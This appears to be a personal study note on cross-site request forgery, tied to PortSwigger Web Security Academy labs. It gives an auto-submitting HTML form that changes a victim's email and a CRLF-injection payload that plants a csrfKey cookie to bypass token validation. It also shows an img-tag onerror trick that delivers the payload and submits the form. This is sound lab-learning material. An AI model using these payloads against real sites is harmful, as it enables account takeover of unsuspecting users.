## basic 
same as [[tools  & setup#Burp Suit | burp suit professional]]

```html
<form method="POST" action="https://vulnerable-website.com/my-account/change-email">
	<input type="hidden" name="email" value="anything%40web-security-academy.net">
</form> 
<script> 
document.forms[0].submit(); 
</script>
```
## Bypassing CSRF token validation
### token tied to non-session cookie 
(like when they use two *seperate frameworks* ) : [portswigger](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)
#### csrfKey cookie injection 

> 1. `/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None`

#### using img tag for delivering the crafted link

>1. `<img src="https://vulnerable-website.com/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">`
